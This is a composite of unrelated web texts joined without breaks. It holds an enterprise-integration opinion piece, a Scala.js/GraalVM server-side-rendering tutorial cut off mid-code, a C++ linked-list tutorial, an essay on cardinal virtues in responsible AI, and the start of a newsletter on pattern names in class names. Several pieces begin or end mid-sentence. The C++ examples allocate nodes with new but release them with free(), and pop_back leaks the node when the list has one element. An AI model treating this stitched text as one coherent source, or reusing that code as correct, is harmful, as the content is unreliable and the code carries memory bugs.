<p>Enterprise Integration is a smart workaround to mitigate some of the technology immaturities around data storage, workarounds are meant for the short term and it doesn't last long.</p>
<p>Lets see why it was a workaround:</p>
<p><strong>Building dumb integration pipes:</strong> This was a rule of thumb given to any integration developer - ”Keep the integration pipelines as dumb as possible = No business rules = No complex transformations” This was etched on every integration developer, every pipeline was built on top of this fundamental philosophy. Why ?</p>
<ul>
<li><strong>In-memory limitations</strong> - All these integration platforms were built using traditional runtimes, Eg: Tomcat. These runtimes depend on the limited heap space provided within a VM/Machine. When you are processing 10 TPS(Transactions per second) on a 8 Gig machine, You don't have room for doing any computation on the data, the faster you send the data out, it's good for the runtime. If you add any business logic, Eg: any simple aggregate function (SUM, COUNT, etc), your runtime will start accumulating messages and it will blow into pieces.</li>
</ul>


<figure>
<img src="https://gnana.io/image/memory-constraint.png">
<figcaption>
<h4>Memory constraints</h4>
</figcaption>
</figure>

<ul>
<li><strong>Store First, Process Next</strong> - This is a golden philosophy in enterprise architecture isn't it, more than a philosophy its a habit. If you want to build a website, first design database tables, if you want to build a integration pipe, first figure out where you will store data, if you want to process data, first store it somewhere. In order to process data, we have to accumulate data first ! This is not just a habit, we got into this habit because of the previous limitation - We only relied on in-memory(RAM) capacity to handle data, we were able to build too many integrations, but we were never able to store the data in the pipe itself. Obviously you cant permanently store data in memory. All those million dollar pipes are dumb, you still need another multi-tier architecture to store your data.</li>
</ul>


<figure>
<img src="https://gnana.io/image/storage-habit.png">
<figcaption>
<h4>Loosing real-time advantage</h4>
</figcaption>
</figure>

<p>This really means, “Building dumb integration pipelines” or “Integration Pipelines without business rules” was just an approach to mitigate the underlying technology limitations. We clinged too much into building dumb pipes instead of trying to fix the under the hood infrastructure limitations.</p>
<blockquote>
<p>“Q: Hey come on, we deploy Integration Pipelines using Kubernetes, We can handle a lot of traffic."</p>
</blockquote>
<blockquote>
<p>"A: As the integration market matured, we also improved technologies around scalability. Kubernetes is one great example, It is still a great technology for a lot of use cases and it has a promising future. But for Enterprise Integration, Kubernetes is a horse blinker - Integration pipelines were predominantly stateless services, we were able to scale integration pipelines to handle more traffic, but we were never able to efficiently process data on the fly. (I am not saying Kubernetes is bad for stateful services, Enterprise Integration products narrowed too much into the philosophy of building dumb pipes, isolating themselves away from data processing patterns)”</p>
</blockquote>

<p>Lets see why Enterprise Integration cannot cope with business demands going forward</p>
<ul>
<li><strong>Value is in the pipeline:</strong> As more and more connected applications you have, you can't afford to use ‘data at rest’ approach to generate business value. With more applications connected and fast moving data, the opportunity window to process data is getting narrower. Which means, businesses cannot wait for the data to be accumulated first, in order to process them. Basically, businesses needs smarter pipes not the dumb ones. Smarter here refers to the ability to store and process data on the fly.</li>
</ul>


<figure>
<img src="https://gnana.io/image/data-flow-dumb.png">
<figcaption>
<h4>Dumb pipes</h4>
</figcaption>
</figure>

<ul>
<li><strong>Integration is tightly Coupled:</strong> When you build integration pipelines, you tightly couple your mapping transformations with source/destination protocol. This means, you can't scale above a threshold Eg: You may be able to scale your integration pipeline using 100 pods in Kubernetes, but if your destination REST API can't handle your volume, you are going to kill them.</li>
</ul>


<figure>
<img src="https://gnana.io/image/integration-pipeline.png">
<figcaption>
<h4>Typical integration pipeline</h4>
</figcaption>
</figure>

<ul>
<li><strong>Point to Point integration problems still exist:</strong> The whole promise of integration products was to avoid point to point integrationa, instead integration products created an envelope on top direct integrations. If we take a step back and look at all the integration flows we built, Its déjà vu: "the same point to point integrations inside a costly wrapper"</li>
</ul>


<figure>
<img src="https://gnana.io/image/enterprise-integration-before-and-after.png">
<figcaption>
<h4>Point to point integrations stay as is</h4>
</figcaption>
</figure>

<ul>
<li><strong>Incomplete Event Driven Architecture:</strong> Of course Integration was built on event driven principles, for eg: JMS queues, we built nice event driven pipelines using queues, but in the end didn't we forcefully kill those events by passively storing them somewhere ? (We will talk about batch processing in a separate blog)</li>
</ul>
<p>In summary, Middlewares/Integration products became quite critical in enterprises. Unfortunately, these products did not evolve as better as Enterprises evolved. Businesses are looking into data that is active, data that is on the move, to process a business event as and when it happens, generate value to a customer as fast as they can, but Integration products can't cope with this evolution.</p>

<p>Absolutely not. But their scope is reducing. Enterprise Integration products create a network of applications within enterprises, but an application network is an overkill when you cannot process the data within the network.</p>


<figure>

<h4>ESB vs ESP</h4>
</figcaption>
</figure>

<p>The only useful pattern that we all learnt from an integration product, is building reusable adapters/connectors. There will always be a diverse number of protocols, there will always be the need for protocol bridging/translations but there will not be a need for integration pipelines. Dumb pipes will diminish, “Processing data while its on the move” is what is helping enterprises today and dominate enterprise architecture in the future.</p>

<p>As the number of applications grow, they will generate more and more meaningful events, events around your customers, partners, business transactions, etc.</p>
<p>If you look at events as they are, they have life in them. They are generated at a particular time, based on a particular action.</p>
<p>If you build dumb pipes, they may survive for few seconds after they are born, but they will die as soon as it reaches the destination(storage)</p>
<p>All these streams of events are meant to be captured as it is, kept alive as they are, and process them whenever you need to, without flattening them to death.</p>
<p>To do this, you need a platform that can move data …</p></article></div></div></div>

It by Oracle and it’s your normal JDK with a bunch of extra stuff that, as far as I know,
will eventually make it’s way back into Java proper.
The reason we want use Graal is because of its <a href="https://www.graalvm.org/docs/reference-manual/polyglot" target="_blank" rel="noopener">Polyglot support</a>.
Java’s made a few attempts at being able to embed JavaScript, first with Rhino, then Nashhorn,
and now again with the Polyglot/Truffle API. Unlike previous attempts, this new approach…</p><ol><li>converts JS into Truffle IR where it’s able to be heavily optimised by the new Graal JIT/optimiser (i.e. successor to HotSpot)</li><li>it’s capable of way more than just JS, and out-of-the-box it already supports R, Python, LLVM and Ruby.</li></ol><p>If “Oracle” makes you wary due to licencing, don’t worry: there are two editions of Graal available.</p><ol><li>Community Edition (CE) which is completely free, and ~5% faster than the standard JVM</li><li>Enterprise Edition (EE) which is not free, and has more JIT optimisations giving you 5-15% better runtime performance</li></ol><p>We’ll use Graal (not just locally but as the JVM you deploy to production with your app), so that it can execute JS.
Specifically, it will execute the transpiled output of your <a href="https://www.scala-js.org/" target="_blank" rel="noopener">Scala.JS</a> app.</p><blockquote><p>Note: even without embedding JS, there’s a compelling reason to run your Scala with <a href="https://www.graalvm.org/" target="_blank" rel="noopener">GraalVM</a>:
the new JIT is significantly better at optimising Scala. <a href="https://www.graalvm.org/scala" target="_blank" rel="noopener">Read mode…</a></p></blockquote><h2>Step 2/5: scala-graal</h2><p>We’re going to use <a href="https://github.com/japgolly/scala-graal" target="_blank" rel="noopener">scala-graal</a> to help glue all of our pieces together.
What <a href="https://github.com/japgolly/scala-graal" target="_blank" rel="noopener">scala-graal</a> is going to give us is:</p><ul><li>make calling JS from JVM nice, easy, and safe by providing a concise, Scala-friendly interface</li><li>allow interpolation, meaning you don’t have to worry about safely marshalling arguments and composing with your commands</li><li>pre-compilation of your SSR</li><li>huge performance increases to your SSR - either by a special type of caching (to be covered in part 2 of this article) or by JIT warmup</li><li>helpers for SSR specifically</li><li>we won’t use them here, but there are a bunch of other features like thread-pools, async, time-limits, metrics and more
so check that out in <a href="https://github.com/japgolly/scala-graal" target="_blank" rel="noopener">scala-graal’s doc</a> if you’re interested.</li></ul><p>Next let’s talk about how this is going to

You need a communication protocol.
We’ll use <a href="https://github.com/suzaku-io/boopickle" target="_blank" rel="noopener">BooPickle</a>, a very fast binary serialisation library, to marshall data back and forth between the JVM and JS-embedded-in-the-JVM.</li></ul><blockquote><p>Note: Whether you’re enabling SSR on 1 page or 100 pages, you only need to create one SSR project.
The pages/SPAs can (and should) live in their own SBT modules. Every time you want to equip a new component
with SSR, you simply add it’s module to the <code>.dependsOn(…)</code> list above.</p></blockquote><h2>Step 3/5: Prepare the SSR JS</h2><p>Firstly we’ll create a little API in <code>webapp-ssr/shared/src/main/scala</code>,
to be shared between the JVM &amp; JS modules. This will serve as the contract and protocol between both worlds.</p><div data-language="scala"><pre><code><span>import</span> <span>boopickle<span>.</span></span>Default<span>.</span>_

<span>object</span> SsrSharedData <span>{</span>

  <span>object</span> Manifest <span>{</span>
    <span>final</span> <span>val</span> MySpa <span>=</span> <span>"mySpa"</span>
  <span>}</span>

  <span>final</span> <span>case</span> <span>class</span> MySpaInputs<span>(</span>name<span>:</span> <span>String</span><span>,</span> age<span>:</span> <span>Int</span><span>)</span>

    generatePickler<span>[</span>MySpaInputs<span>]</span>
<span>}</span></code></pre></div><p>Here we’re doing three things.</p><ol><li><p>With <code>SsrSharedData.Manifest.MySpa</code>, we’re declaring the name of the JS function that we’ll soon export.
Its value can be anything so long as it’s unique and doesn’t conflict with anything
available in the global JS environment.
(It has to be a <code>final val</code> so that it can be used in annotations.
This is equivalent to the much-clearer <code>inline val</code> in Scala 3.)</p></li><li><p>We declare a <code>MySpaInputs</code> class to contain all the inputs/args/props to our React component.</p></li><li><p>We declare an implicit <code>Pickler[MySpaInputs]</code> instance so that we can serialise the data
we need to send from the JVM to JS.</p></li></ol><p>You might wonder why I’m creating a <code>Manifest</code> object with only one constant. Seems a bit wasteful.
It’s because you might have more than just one page you want to equip with SSR, in which case you would
add a new entry to manifest, and (optionally) a new input class &amp; pickler.</p><p>Next, let’s expose the component we want to serve with SSR.
Create the following in <code>webapp-ssr/js/src/main/scala</code>:</p><div data-language="scala"><pre><code><span>import</span> <span>japgolly<span>.</span>scalagraal<span>.</span></span>Pickled
<span>import</span> <span>japgolly<span>.</span>scalajs<span>.</span>react<span>.</span></span>ReactDOMServer
<span>import</span> <span>scala<span>.</span>scalajs<span>.</span>js<span>.</span>annotation<span>.</span></span>JSExportTopLevel


<span>object</span> SsrJs <span>{</span>
  <span>import</span> SsrSharedData<span>.</span>_

  <span>@JSExportTopLevel</span><span>(</span>Manifest<span>.</span>MySpa<span>)</span>
  <span>def</span> mySpa<span>(</span>p<span>:</span> Pickled<span>[</span>MySpaInputs<span>]</span><span>)</span><span>:</span> <span>String</span> <span>=</span> <span>{</span>
    <span>val</span> input <span>=</span> p<span>.</span>value 
    <span>val</span> vdom <span>=</span> MyComponent<span>(</span>input<span>)</span> 
    ReactDOMServer<span>.</span>renderToString<span>(</span>vdom<span>)</span>
  <span>}</span>
<span>}</span></code></pre></div><p>I believe this is self-explanatory.
We take serialised input, deserialise it, pass it to our component, then
get React to render it to a string. The resulting string is the HTML that we’ll
soon serve to users.</p><h2>Step 4/5: Hydrate yourself</h2><p>When the frontend loads, it mounts itself into the DOM.
You’ll need to now change this to “hydrate” the DOM that you rendered on the backend
and sent as part of the page HTML. Change it as follows:</p><div data-language="diff"><pre><code><span><span> </span><span>  def main(args: Array[String]): Unit = {
</span><span> </span><span>    val container = dom.document.getElementById("root")
</span><span> </span><span>    val myPage = MyPageComponent(…)
</span></span><span><span>-</span><span>    myPage.renderIntoDOM(container)
</span></span><span><span>+</span><span>    ReactDOM.hydrateOrRender(myPage, container)
</span></span><span><span> </span><span>  }</span></span></code></pre></div><p>We could’ve used <code>ReactDOM.hydrate</code> directly but I prefer to use <code>ReactDOM.hydrateOrRender</code>
because we can set it once and forget about it, regardless of whether we decide to
server-side-render it, or not. Otherwise, you’d have a code dependency where you’d have to keep
the frontend code in sync (by choosing either <code>render</code> or <code>hydrate</code>) with whatever the
backend code does.</p><p>It also allows you to make SSR conditional at runtime.
An example use case for this (which <a href="https://github.com/japgolly/scala-graal" target="_blank" rel="noopener">scala-graal</a> has support for doing easily),
is to set a time limit for each server-side-render, and let the page render
without SSR if the backend cant render the page fast enough. In such a case the frontend <em>must</em>
use <code>ReactDOM.hydrateOrRender</code> as it doesn’t know ahead of time what the server’s going to do.</p><h2>Step 5/5: SSR in the JVM</h2><p>The final step. Here we’ll execute JS and React in the JVM.</p><p>We’ve already got our <a href="https://www.scala-js.org/" target="_blank" rel="noopener">Scala.JS</a> output file on our classpath; we did that in step 2
by configuring SBT. You’ll also need React itself on your classpath.
The quickest way is to just download React JS and dump it into your <code>webapp-ssr/jvm/src/main/resources</code> directory.
That’s not the optimal way.
The optimal way is quite open-ended and should align with other ways you’re managing JS dependencies in your project,
so I’ll leave that that as an exercise to the reader.
<em>(In my case, I have a webpack build outside of SBT that manages all of my JS, and I have symlinks in SBT to its output.)</em></p><p>Let’s start by creating a file in <code>webapp-ssr/jvm/src/main/scala</code>:</p><div data-language="scala"><pre><code><span>import</span> <span>japgolly<span>.</span>scalagraal<span>.</span></span>_

<p>In the <a href="https://www.alphacodingskills.com/ds/linked-list.php">previous section</a>, we had discussed about structure of linked list. In this section, we will learn about basic operations of a linked list.</p>

<h2>Traverse a Linked List</h2>
<p>Traversing through a linked list is very easy. It requires creating a temp node pointing to the head of the list. If the temp node is not null, display its content and move to the next node using temp next. Repeat the process till the temp node becomes null. If the temp node is empty at the start, then the list contains no item.</p>

<div> 
<!--   <div class="titlebox"><i class="fa fa-pencil fa-pencil-style"></i></div><p></p>   -->    
<pre>//C++ Code
//Display the content of the list
void PrintList() {
  
  //1. create a temp node pointing to head
  Node* temp = head;
  
  //2. if the temp node is not null continue 
  //   displaying the content and move to the 
  //   next node till the temp becomes null
  if(temp != NULL) {
    cout&lt;&lt;"\nThe list contains: ";
    while(temp != NULL) {
      cout&lt;&lt;temp-&gt;data&lt;&lt;" ";
      temp = temp-&gt;next;
    }
  } else {
    
    //3. If the temp node is null at the start, 
    //   the list is empty
    cout&lt;&lt;"\nThe list is empty.";
  }
} 
</pre>
</div>

<br>
<h2>Insert a new node in Linked List</h2>
<p>A new node can be inserted into a list in three ways:</p>
<ul>
  <li>Insert a node at the start</li>
  <li>Insert a node at the given position</li>
  <li>Insert a node at the end</li>
</ul>
<h3>Insert a new node at the start</h3>
<p>In this method, a new node is inserted at the beginning of the linked list. For example - if the given list is 10-&gt;20-&gt;30 and a new element 100 is added at the start, the list becomes 100-&gt;10-&gt;20-&gt;30.</p>

<p>Inserting a new node at the beginning of the Linked List is very easy. First, a new node with given element is created. It is then added before the head of the given list that makes the newly added node to new head of the list by changing the head pointer to point to the new node.  </p>

<div> 
<!--   <div class="titlebox"><i class="fa fa-pencil fa-pencil-style"></i></div><p></p>   --> 
<pre>//C++ Code
//Inserts a new node at the start 
void push_front(int newElement) {
  
  //1. allocate a new node
  Node* newNode = new Node();
  
  //2. assign data element 
  newNode-&gt;data = newElement;
  
  //3. make next node of new node as head
  newNode-&gt;next = head;
  
  //4. make new node as head 
  head = newNode;   
}
</pre>
</div>


<br>
<h3>Insert a new node at the given position</h3>
<p>In this method, a new element is inserted at the specified position in the linked list. For example - if the given list is 10-&gt;20-&gt;30 and a new element 100 is added at position 2, the list becomes 10-&gt;100-&gt;20-&gt;30.</p>
<p>First, a new node with given element is created. If the insert position is 1, then the new node is made to head. Otherwise, traverse to the node that is previous to the insert position and check if it is null or not. In case of null, the specified position does not exist. In other case, assign next of the new node as next of the previous node and next of previous node as new node.</p>


<div> 
<!--   <div class="titlebox"><i class="fa fa-pencil fa-pencil-style"></i></div><p></p>   -->    
<pre>//C++ Code
//Inserts a new node at the given position
void push_at(int newElement, int position) {
  
  //1. allocate node to new element
  Node* newNode = new Node(); 
  newNode-&gt;data = newElement;
  newNode-&gt;next = NULL;

  //2. check if the position is &gt; 0
  if(position &lt; 1) {
    cout&lt;&lt;"\nposition should be &gt;= 1.";
  } else if (position == 1) {
  
  //3. if the position is 1, make next of the
  //   new node as head and new node as head
    newNode-&gt;next = head;
    head = newNode;
  } else {

   //4. Else, make a temp node and traverse to the 
   //   node previous to the position
    Node* temp = head;
    for(int i = 1; i &lt; position-1; i++) {
      if(temp != NULL) {
        temp = temp-&gt;next;
      }
    }
 
    //5. If the previous node is not null, make 
    //   newNode next as temp next and temp next 
    //   as newNode.
    if(temp != NULL) {
      newNode-&gt;next = temp-&gt;next;
      temp-&gt;next = newNode;  
    } else {
      
      //6. When the previous node is null
      cout&lt;&lt;"\nThe previous node is null.";
    } 
  }
}
</pre>
</div>

<br>
<h3>Insert a new node at the end</h3>
<p>In this method, a new node is inserted at the end of the linked list. For example - if the given list is 10-&gt;20-&gt;30 and a new element 100 is added at the end, the list becomes 10-&gt;20-&gt;30-&gt;100. </p>

<p>Inserting a new node at the end of the Linked List is very easy. First, a new node with given element is created. It is then added at the end of the list by linking the last node to the new node. </p>

<div> 
<!--   <div class="titlebox"><i class="fa fa-pencil fa-pencil-style"></i></div><p></p>   -->    
<pre>//C++ Code
//Inserts a new node at the end
void push_back(int newElement) {
  
  //1. allocate node
  Node* newNode = new Node();
  
  //2. assign data element
  newNode-&gt;data = newElement;
  
  //3. assign null to the next of new node
  newNode-&gt;next = NULL; 
  
  //4. Check the list is empty or not,
  //   if empty make the new node as head 
  if(head == NULL) {
    head = newNode;
  } else {
    
    //5. Else, traverse to the last node
    Node* temp = head;
    while(temp-&gt;next != NULL)
      temp = temp-&gt;next;
    
    //6. Change the next of last node to new node
    temp-&gt;next = newNode;
  }    
}
</pre>
</div>

<br>
<h2>Delete a Node from Linked List</h2>
<p>A node can be deleted from a list in three ways:</p>
<ul>
  <li>Delete the first node</li>
  <li>Delete the node at given position</li>
  <li>Delete the last node</li>
</ul>
<h3>Delete the first node</h3>
<p>In this method, the first node of the linked list is deleted. For example - if the given list is 10-&gt;20-&gt;30-&gt;40 and the first node is deleted, the list becomes 20-&gt;30-&gt;40.</p>

<p>Deleting the first node of the linked list is very easy. If the head is not null then create a temp node pointing to head and move head to the next of head. Then delete the temp node. </p>

<div> 
<!--   <div class="titlebox"><i class="fa fa-pencil fa-pencil-style"></i></div><p></p>   -->     
<pre>//C++ Code
//Deletes the first node
void pop_front() {
  if(head != NULL) {
    
    //1. if head is not null, create a
    //   temp node pointing to head
    Node* temp = head;

    //2. move head to next of head
    head = head-&gt;next; 

    //3. delete temp node
    free(temp); 
  }
}
</pre>
</div>

<br>
<h3>Delete a node from middle</h3>
<p>In this method, a node at the specified position in the linked list is deleted. For example - if the given list is 10-&gt;20-&gt;30 and the 2<sup>nd</sup> node is deleted, the list becomes 10-&gt;20.</p>
<p>First, the specified position must be greater than equal to 1. If the specified position is 1 and head is not null, then make the head to head next. Else, traverse to the node that is previous to the specified position. If the specified node and previous to the specified node are not null then adjust the link and delete the node at specified position. In other case, the specified node will be already null.</p>

<div> 
<!--   <div class="titlebox"><i class="fa fa-pencil fa-pencil-style"></i></div><p></p>   -->    
<pre>//C++ Code
//Deletes the node at given position
void pop_at(int position) {     
  
  //1. check if the position is &gt; 0
  if(position &lt; 1) {
    cout&lt;&lt;"\nposition should be &gt;= 1.";
  } else if (position == 1 &amp;&amp; head != NULL) {
      
    //2. if the position is 1 and head is not null,
    //   make head to head next and delete the 
    //   previous head
    Node* nodeToDelete = head;
    head = head-&gt;next;
    free(nodeToDelete);
  } else {
    
    //3. Else, make a temp node and traverse to the 
    //   node previous to the position
    Node* temp = head;
    for(int i = 1; i &lt; position-1; i++) {
      if(temp != NULL) {
        temp = temp-&gt;next;
      }
    }
 
    //4. If the previous node and next of the previous  
    //   is not null, adjust links 
    if(temp != NULL &amp;&amp; temp-&gt;next != NULL) {
        Node* nodeToDelete = temp-&gt;next;
        temp-&gt;next = temp-&gt;next-&gt;next;
        free(nodeToDelete); 
    } else {

      //5. Else the given node will be empty.
      cout&lt;&lt;"\nThe node is already null.";
    }       
  }
} 
</pre>
</div>

<br>
<h3>Delete the last node</h3>
<p>In this method, the last node of the linked list is deleted. For example - if the given list is 10-&gt;20-&gt;30-&gt;40 and the last node is deleted, the list becomes 10-&gt;20-&gt;30.</p>
<p>Deleting the last node of the Linked List involves checking the head for empty. If it is not empty, then check the head next for empty. If the head next is empty, then release the head, else traverse to the second last node of the list. Then, link the next of second last node to NULL and delete the last node.  </p>

<div> 
<!--   <div class="titlebox"><i class="fa fa-pencil fa-pencil-style"></i></div><p></p>   -->  
<pre>//C++ Code
//Deletes the last node
void pop_back() {
  if(head != NULL) {
    
    //1. if head in not null and next of head
    //   is null, release the head
    if(head-&gt;next == NULL) {
      head = NULL;
    } else {
      
      //2. Else, traverse to the second last 
      //   element of the list
      Node* temp = head;
      while(temp-&gt;next-&gt;next != NULL)
        temp = temp-&gt;next;
      
      //3. Change the next of the second 
      //   last node to null and delete the
      //   last node
      Node* lastNode = temp-&gt;next;
      temp-&gt;next = NULL; 
      free(lastNode);
    }
  }
}
</pre>

August 21, 2020 | https://montrealethics.ai/virtues-not-principles/ | <a href="https://web.archive.org/web/*/https://montrealethics.ai/virtues-not-principles/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text">




<p>There has been a recent explosion of interest in the field of <a href="https://montrealethics.ai/the-state-of-ai-ethics-report-june-2020/">Responsible Artificial Intelligence</a> (aka AI Ethics). It is well understood that AI is having (and will continue to have) significant social implications as the technology currently exists. Concerns over bias, fairness, privacy, and labour market impacts do not require the arrival of some mythical Artificial General Intelligence (AGI) to be socially destructive. Organisations from around the world are <a href="https://arxiv.org/ftp/arxiv/papers/1906/1906.11668.pdf">publishing frameworks</a> for the ethical development and deployment of AI, corporations are affirming their commitment to social responsibility by funding responsible AI research and creating review boards, and a political interest in AI has led to state guidelines from <a href="https://oecd.ai/countries-and-initiatives">numerous countries</a>. Despite this, to many observers, little feels to have changed. Algorithms with suspected bias continue to be used, privacy continues to be a major concern, and accountability is near non-existent.</p>



<p>The failure of progress in responsible AI stems from a mistaken approach which prioritises good outcomes over good behaviour. It is uncontroversial to say that bias is bad and that privacy is good, but what this means in practice is more contentious. By attempting to simplify the work of achieving good outcomes to “frameworks” or “principles” the work being done in the field risks bearing little fruit. Our understanding of how AI systems can lead to problematic social outcomes is inherently reactive, in that we respond to problems that can be documented. The goal of responsible AI, however, is to be proactive by anticipating potential harms and mitigating their impact. Checklists on what ought to be done can never achieve the full range of potential risks that responsible AI seeks to address, and as a result are inherently limited. Proactive concern with socially beneficial outcomes requires not just work on frameworks for ethical use, but the cultivation of virtuous technologists and managers, who are motivated to take the concerns of responsible AI seriously.</p>



<p>The importance of virtue is clear when we consider the failure modes of principles-driven approaches to Responsible AI: non-adoption and recuperation. Either principles will be ignored, or they will be contorted to serve the interests of the status quo.</p>



<p>The risk of non-adoption is currently the more pervasive problem facing responsible AI work. In the rush to develop principles and guidelines competing approaches fail to generate consensus, and as a result have low impetus for adoption. Where a set of guidelines have low implementation costs, they may be championed to little or no effect. Where the burden of principles is too high, nobody cares to use them. If work is too technically focussed, it’s hard to communicate what has been achieved. If work is too value driven, it’s hard to audit whether anything has been done and it has limited practical applicability.</p>



<p>Even if consensus were to exist and the ideal set of principles formulated, this would not in and of itself motivate adoption. A lot of work has gone into consensus building among ethicists and commoditising the various implementations of responsible AI tools such as differential privacy, but this alone does not make technologists or business leaders care. Regulatory approaches seek to create the right incentives for following ethical guidelines by penalising bad behaviour, but these run into huge cost barriers to enforce and are slow to develop and diffuse. Even if ideal enforcement mechanisms were discovered, they would fail to create the proactive concern with social outcomes that responsible AI practitioners desire. <a href="https://www.amazon.ca/Moral-Economy-Incentives-Substitute-Citizens/dp/0300163800">Good incentives are no substitute for good citizens</a>.</p>



<p>The degradation of responsibility and civic duty that incentive driven adoption creates leads to the second failure mode of current responsible AI approaches, recuperation. Recuperation is the risk of sincere work being co-opted by those who are in power. The common cries of “<a href="https://www.technologyreview.com/2019/12/27/57/ai-ethics-washing-time-to-act/">ethics washing</a>” and “<a href="https://www.vox.com/podcasts/2019/4/8/18299736/artificial-intelligence-ai-meredith-whittaker-kate-crawford-kara-swisher-decode-podcast-interview">ethics theatre</a>” that dominate high profile efforts by corporations to respond to the concerns of responsible AI practitioners reveal that without a sincere motivation to care, principles can be reduced to PR gimmicks. </p>



<p>Technical jargon can bury sincere conversations about social consequences, making it seem as if lots is being done. Review boards that hold <a href="https://www.theverge.com/interface/2020/1/30/21113273/facebook-oversight-board-jurisdiction-bylaws-restrictions">no actual power</a> over decisions become <a href="https://www.vox.com/future-perfect/2019/4/4/18295933/google-cancels-ai-ethics-board">poster children</a> for corporate efforts. Internal memos may normalise a certain sort of discourse around responsibility, with little to no actual understanding of the content. Regulatory compliance may become a way to capture markets by increasing barriers for new entrants. Even without the malice associated with naked self-interest, recuperation can result from laziness. If ethical concerns are reduced to checklists one simply has to tick off, the letter of the law may be followed, but its spirit completely lost. This would require the field of responsible AI to remain in constant vigilance to identify new risks and formulate new approaches for everyone to follow. In doing so, the law would get larger, but adherence would decline.</p>



<p>None of this is to say that work on principles is inherently useless, but rather that good behaviour relies on good people. Principles are put into place by people, and they embody the character of those who implement them. In order to achieve the goals of the responsible AI community, making people care about being good needs to be the primary goal. This requires a cultivation of virtue.</p>



<p>Dating back to Ancient Greece the concept of the <a href="https://plato.stanford.edu/entries/plato-ethics/">Cardinal Virtues</a> has been a pillar in moral philosophy as prerequisites for living a good life. A virtuous person is one capable of doing good, and they provide a bedrock upon which the internal motivation to do the right thing rests. Traditionally, the Cardinal Virtues are Prudence, Fortitude, Temperance, and Justice. By focussing on cultivating these virtues among the practitioners who develop and deploy AIs, from researchers to ML engineers to data scientists to project managers to executives, the responsible AI community would be more successful in ensuring proactive social concern. Each of these virtues is essential, and none on their own is sufficient to guarantee prosocial outcomes.</p>



<p>The first of these virtues is Prudence, which can be roughly equated to foresight or practical wisdom. It is probably the only virtue that is emphasised in education and work environments today. A prudent person is able to judge what the right thing to do is at the right time. The ability to make rational judgements about what one can best spend their time doing, what is the best use of the resources at their disposal, and whether a risk is worth taking are the fruits of prudence. </p>



<p>In the AI context, prudent practitioners are able to understand the consequences of what they are building, accurately describe the limits of their programs, and evaluate the opportunity costs of solving different problems using AI or solving a problem using AI rather than more conventional methods (such as human labour or rules-based programs). All of these decisions are critical for evaluating whether the outcomes of a system are socially beneficial or harmful, and the process by which this understanding comes about cannot be reduced to a checklist.</p>



<p>The next virtue is Fortitude, which can be equated with moral courage or perseverance. Fortitude enables one to do the right thing no matter the personal consequences or the stigma associated with a course of action. There are fields where fortitude is emphasised, such as in the military and in nuclear power management, where there is a pervasiveness of uncertainty and the consequences of error are disastrous. A lack of fortitude among AI practitioners poses many risks as without fortitude those who notice a problem may be afraid to speak up, the voice of one’s conscience may be drowned out by a desire to go with the flow or to protect one’s career, and doubt may confuse one’s ability to make effective judgements. Cultivating fortitude goes beyond the education of what the right thing to do is that currently grabs the attention of the responsible AI community by providing practitioners with the tools to act on the right thing.&nbsp;&nbsp;&nbsp;</p>



<p>Then there is Temperance, which can be equated with self-restraint or moderation. Plato himself considered this the most important of all the virtues as it enabled one to be humble and avoid acting rashly. Temperance enables people to understand their own failings and critically examine their own whys for acting. This virtue has played a foundational role in most of the world’s great religions and cultures, though its popular emphasis ebbs and flows. Organisations such as the Boy Scouts seek to cultivate this virtue, as do philosophy and meditation. The risks of intemperance for AI are severe as it would allow personal desires, for recognition or power or profit or even pure intellectual curiosity, to cloud judgement. Without temperance practitioners would be less willing to acknowledge their own biases and limitations, and as a result may refuse to acknowledge the harms that could be caused by what they develop.</p>



<p>Finally, there is Justice, which encompasses concepts of fairness and charity. The scales of justice in classical iconography sum up the balance between selfishness and selflessness that defines the just person. The golden rule that one ought to treat others as one ought to be treated cuts to the heart of just behaviour. The concerns of justice are front and centre in the work of most responsible AI researchers, as they seek to ensure that AIs do not discriminate against the disenfranchised and that diversity among practitioners provides representation to all voices. The risks of being unjust are evident and well understood, that the development of AIs will prioritise the people building it or people like them at the expense of the whole. Despite this understanding, …</p></div></div>

																		<p>I first heard this as 'There are only two hard things in Computer Science: cache invalidation, naming things, and off-by-one errors.'</p>

																		<p>I passed this phrase on for many years before realizing that the 'off-by-one errors' bit was a joke.</p>

																		<p>Truth.</p>

																		<p>I am so literal that it pains me. I confess this in case it's paining you too. Puns, for example, fly right over my head, and any that I make are most likely inadvertent. I don't believe that there are any puns in the text that follows—but how would I know?</p>

																		<h2>Thoughts on Using Pattern Names in Class Names</h2>

																		<p>I've always heard that it's best to avoid using pattern names in class names. As one so often does, I've cargo-culted this rule without truly examining it. I habitually obey it myself, and teach it to folks in my OOD classes, but until recently I couldn't have articulated a convincing defense.</p>

																		<p>But then, while writing the 2nd Edition of 99 Bottles of OOP, I broke it. I created a new class whose name included the name of a pattern. I did this because it just felt right.</p>

																		<p>This put me in a pickle.</p>

																		<p>I very much believe in being guided by feelings about code, but when writing a book one can't just say, 'Okay, now do this because I, the author, <em>feel</em> like you should'. Respect for the reader requires investing sincere effort into dragging feelings about code into the light of day, and at least <em>trying</em> to justify them with convincing words.</p>

																		<p>Below I've included the excerpt from the book where I attempt just such convincing. The excerpt explains the purpose of the no-pattern-names-in-class-names rule and defends its utility.</p>

																		<p>I've built a newsletter around this rule not only because I believe that it's useful, but also because my initial attempts to explain it exposed deep holes in my understanding. This was a revelation. Had I not been writing a book, I might have hand-waved around these gaps in my knowledge forever.</p>

																		<h3>Some Context</h3>

																		<p>Before moving on to the excerpt, here's a bit of context to orient you. At this point in the book:</p>

																		<ul>
																			<li>
																			<p>The code contains a <code>CountdownSong</code> class that gets injected with a player of the <code>verse template</code> role.</p>
																			</li>
																			<li>
																			<p><code>BottleVerse</code> is the only class that plays this role. It's used as the default <code>verse template</code> in <code>CountdownSong</code>.</p>
																			</li>
																		</ul>

																		<p>So, <code>CountdownSong</code> has-a <code>verse template</code>, whose concrete implementation is supplied by <code>BottleVerse</code>.</p>

																		<ul>
																			<li>
																			<p>I'm writing tests for <code>CountdownSong</code>, and have just decided to create a new player of the <code>verse template</code> role to inject for use during these tests.</p>
																			</li>
																			<li>
																			<p>I've named this new class <code>VerseFake</code>.</p>
																			</li>
																		</ul>

																		<p>The excerpt below also mentions a <code>BottleNumber</code> class. This class wraps a number to add bottle-ish behavior.</p>

																		<h3>The Excerpt</h3>

																		<p>With that, here's a bit of chapter 9:</p>

																		<blockquote>
																		<p><em>The <code>VerseFake</code> class above is perfect for your needs, though it must be acknowledged that it unrepentantly breaks several common programming rules.</em></p>

